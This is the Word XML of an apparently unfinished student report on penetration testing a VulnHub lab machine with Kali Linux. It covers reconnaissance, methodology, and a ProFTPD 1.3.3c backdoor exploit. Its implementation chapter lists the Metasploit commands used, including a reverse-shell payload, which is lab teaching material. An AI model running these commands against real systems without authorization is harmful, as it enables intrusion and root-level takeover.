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3814" w:rsidRDefault="003D3814">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>DRAFT-1 …refer to chatgpt for more content</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003D3814" w:rsidRDefault="003D3814">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003D3814" w:rsidRDefault="003D3814">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003D3814" w:rsidRDefault="003D3814">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>Offensive Hacking and Penetration Testing in a Virtual Environment Using Kali Linux</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Author: [Your Name]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Institution: [Your College/University Name]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Guide/Supervisor: [Guide’s Name]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Submission Date: April 2025</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Abstract</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:t>This project explores offensive cybersecurity techniques through penetration testing in a controlled virtual environment using Kali Linux. It documents the process of exploiting vulnerable systems, focusing on the confidentiality, integrity, and availability of digital assets. The project follows a structured methodology including reconnaissance, vulnerability analysis, exploitation, and post-exploitation using tools like Nmap, Nikto, and Metasploit. The hands-on approach resulted in successful exploitation of virtual machines, validating the effectiveness of ethical hacking frameworks. The project aims to enhance understanding of attack surfaces, exploit development, and the importance of proactive defense strategies.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Acknowledgment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:t>I would like to extend my sincere gratitude to my project guide, [Guide’s Name], for their continuous support and guidance. I also thank my institution, peers, and the open-source community for providing resources and tools that made this project successful. Special thanks to the creators of VulnHub and Kali Linux for offering practical learning platforms.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:t>*(This will be auto-generated in Word based on headings.)*</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Chapter 1: Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Cybersecurity is no longer a passive discipline. Offensive techniques like penetration testing have become crucial </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">for identifying vulnerabilities before malicious actors can exploit them. Kali Linux, a Debian-based Linux distribution, </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>is specifically designed for advanced penetration testing and ethical hacking.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Organizations often underestimate the exposure of their systems. Without proactive security measures, systems remain </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>vulnerable to exploitation, threatening data security and privacy.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">This project aims to simulate real-world hacking scenarios using Kali Linux, identify and exploit vulnerabilities, and </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">document findings from these simulations. It is scoped to virtual machines in a lab environment and demonstrates </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>concepts like payloads, shells, and network scanning using actual tools.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Chapter 2: Literature Review</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Penetration testing is commonly performed using one of three approaches: black-box (no prior knowledge), white-box </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">(full knowledge), or grey-box (partial knowledge). Tools like OSSTMM, OWASP guides, and frameworks like NIST SP 800-115 </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>offer structured methodologies.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Penetration testing can target networks, web applications, client-side apps, and even social engineering or wireless </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">infrastructure. Kali Linux provides over 600 tools including Metasploit, Nmap, and Nikto, which form the foundation </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>of ethical hacking toolkits.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Chapter 3: System Design &amp; Methodology</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">This project utilized the Kali Linux operating system on VMware Workstation. Vulnerable targets were downloaded from </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>VulnHub and run in VirtualBox. Networking was bridged to allow discovery and scanning.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Key steps:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>1. Reconnaissance – Using tools like Nmap, Whois, and Shodan</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>2. Vulnerability Analysis – Identifying known CVEs using Nmap scripts</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>3. Exploitation – Leveraging Metasploit to gain system access</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>4. Post-Exploitation – Exploring persistence and data exfiltration</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>5. Documentation – Recording findings for review and reporting</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Chapter 4: Implementation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">The machine 'Basic Pentesting 1' was downloaded from VulnHub. IP address was discovered using `netdiscover`. Nmap was </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>used to detect open ports: 21 (FTP), 22 (SSH), and 80 (HTTP).</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>A backdoor vulnerability in ProFTPD 1.3.3c was found using Nmap scripts. Metasploit's exploit `unix/ftp/proftpd_133c_backdoor`</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>was used with a reverse shell payload. Access was gained with root privileges.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Commands used:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- `nmap -A -p- [TargetIP]`</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- `msfconsole`</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- `use exploit/unix/ftp/proftpd_133c_backdoor`</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- `set RHOST [TargetIP]`</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- `set PAYLOAD cmd/unix/reverse`</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- `exploit`</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Chapter 5: Testing &amp; Evaluation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Testing involved verifying results through multiple scans. Vulnerabilities were validated with external CVE listings. </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>After successful exploitation, session management was done via Metasploit.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Challenges faced:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- VM networking issues (resolved via bridged adapter settings)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Payload compatibility (solved by trying alternate payloads)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Chapter 6: Conclusion and Future Work</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">The project provided real-world exposure to the process of ethical hacking. From reconnaissance to exploitation, each </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>step was performed manually and documented. The ProFTPD backdoor exploit validated the learning path.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Future enhancements could include:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Automation using Python or Bash scripts</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Simulated phishing and client-side attacks</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Expanded tool usage beyond Metasploit</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t>1. NIST. (2008). Technical Guide to Information Security Testing and Assessment.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>2. Offensive Security. (n.d.). Kali Linux Documentation.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>3. CVE Details. https://www.cvedetails.com</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>4. VulnHub. https://www.vulnhub.com</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Appendices</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F6621" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t>- Screenshots of Nmap and Metasploit output</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Log files</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Custom payloads/scripts</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- CVE documentation references</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="003F66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9281872">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="463040887">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1995180810">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1966353771">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="550964709">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="638923824">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="918906937">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1454399375">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="179269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3814"/>
    <w:rsid w:val="003F6621"/>
    <w:rsid w:val="004478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FC5249"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{3F150485-9B32-4E47-AD93-AF88B5BF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Swastik Gondhi</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-04-24T18:03:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>